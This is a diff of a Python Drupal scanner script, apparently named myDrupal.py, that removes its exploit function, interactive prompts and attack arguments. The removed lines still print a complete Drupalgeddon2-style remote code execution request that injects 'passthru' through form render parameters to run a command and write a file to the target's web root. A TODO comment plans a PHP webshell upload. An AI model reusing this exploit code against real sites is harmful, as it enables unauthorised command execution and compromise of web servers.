@@ -5,28 +5,9 @@ import random
 import re
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-####################################################################################################################################
-#					TODO
-####################################################################################################################################
-# Pull in file of paths
-# Do args (possibly remove function from args)
-# cve code 7600
-#	  set command for args
-# add cve code 7602
-#  	will need user, password, command, function | args
-# add cve code drupalgedon1 (eh maybe)
-#
-# Finish fingerpriting of server (add check for write location to decide where to attempt to save file)
-# Implement php webshell to upload
-#
-# fix proxies
-####################################################################################################################################
+####################################################################################################################
 
 verbose = False
-command_file = "god.php"
-command = "echo 'G0d Help you' > " + command_file
-###### FIX PROXY
-#proxies = {'http': proxy, 'https': proxy}
 
 ####################################################################################################################
 
@@ -50,47 +31,6 @@ def get_random_useragent():
   }
   rand_num = random.randrange(1, (len(ua_dict) + 1))
   return ua_dict[rand_num]
-
-####################################################################################################################
-
-def exploit_version(version, vuln_version, target):
-  if vuln_version[0] == '1':
-    if vuln_version[1]:
-      if args.outfile:
-        file.write("==============================================================================================================================" + '\n')
-        file.write("[+] Attempting to exploit " + version + '\n')
-
-      get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':command, 'name[#type]':'markup'}
-      post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
-      r = requests.post(target, data=post_params, params=get_params)
-      
-      m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
-      if m:
-  	    found = m.group(1)
-  	    get_params = {'q':'file/ajax/name/#value/' + found}
-  	    post_params = {'form_build_id':found}
-  	    r = requests.post(target, data=post_params, params=get_params)
-  	    print("\n".join(r.text.split("\n")[:-1]))
-      try:
-        r = requests.get(target + command_file)
-        if r.status_code == 200:
-          print("[+] File seems to have been written")
-          print("[+] Navigate to: " + target + command_file)
-          if args.outfile:
-            file.write("[+] File seems to have been written" + '\n')
-            file.write("[+] Navigate to: " + target + command_file + '\n')
-            file.write("==============================================================================================================================" + '\n')
-      except:
-          print("[-] File may not have been written")
-          print("[-] Navigate to: " + target + command_file)
-          if args.outfile:
-            file.write("[-] File may not have been written" + '\n')
-            file.write("[-] Navigate to: " + target + command_file + '\n')
-            file.write("==============================================================================================================================" + '\n')
-          
-  return
-
-####################################################################################################################
 
 ####################################################################################################################
 
@@ -204,16 +144,7 @@ def get_version(target):
   elif versionX is not None:
     print("[!] Version: " + versionX + " Found")
     print("[!] This is more than likely WRONG!!!")
-    while True:
-      print("[?] Would You Like To Continue? [y/n]")
-      choice = input("[#] => ")
-      if choice == "y":
-        return versionX
-      elif choice == "n":
-        print("[0:)] Thank You For Using... Goodbye")
-        raise SystemExit
-      else:
-        print("[!] INVALID SELECTION.... Select [y/n]")
+    return versionX
   else:
     while True:
       print("[-] Version: Not Detected. Possibly not a Drupal site...")
@@ -270,20 +201,6 @@ def main():
 ## Grab target from list or range
   target = args.target
   version, vuln_version, target = prep_target(target)
-  if True in vuln_version:
-    while True:
-      print("[?] Would you like to attempt to exploit? [y/n]")
-      choice = input("[#] => ")
-      if choice == "y":
-        exploit_version(version, vuln_version, target)
-        break
-      elif choice == "n":
-        print("[0:)] Thank You For Using... Goodbye")
-        raise SystemExit
-      else:
-        print("[!] INVALID SELECTION.... Select [y/n]")
-## if not vulnerable go back and check next target. if no more then exit
-  
   print("[0:)] Thank You For Using... Goodbye")
   raise SystemExit
 
@@ -298,12 +215,6 @@ if __name__ == '__main__':
     ''')
 
   parser.add_argument("target", help="URL of target Drupal site (ex: http://target.com/)")
-  parser.add_argument("-u",  "--user",                                           help="Username")
-  parser.add_argument("-p",  "--password",                                       help="Password")
-  parser.add_argument("-c",  "--command",   default="id",                        help="Command to execute (default = whoami)")
-  parser.add_argument("-f",  "--function",  default="passthru",                  help="Function to use as attack vector (default = passthru)")
-  parser.add_argument("-x",  "--proxy",     default="",                          help="Configure a proxy in the format http://127.0.0.1:8080/ (default = none)")
-  parser.add_argument("-s",  "--scan",      default=False, action="store_true",  help="Command to execute network scan for Drupal instances")
   parser.add_argument("-o",  "--outfile",   default=False, action="store_true",  help="Save results to file")
   parser.add_argument("-v",  "--verbose",   default=False, action="store_true",  help="Increase output verbosity")
   args = parser.parse_args()
@@ -311,17 +222,11 @@ if __name__ == '__main__':
   if args.verbose:
     target = args.target
     verbose = True
-  if args.user and args.password:
-    user = args.user
-    password = args.password
   if args.outfile:
     file = open('log.out','a')
     file.write("==============================================================================================================================" + '\n')
     file.write("myDrupal.py" + '\n')
     file.write("==============================================================================================================================" + '\n')
-#  if args.proxy:
-#    s.proxies['http'] = args.proxy
-#    s.proxies['https'] = args.proxy
   main()
 
 ####################################################################################################################
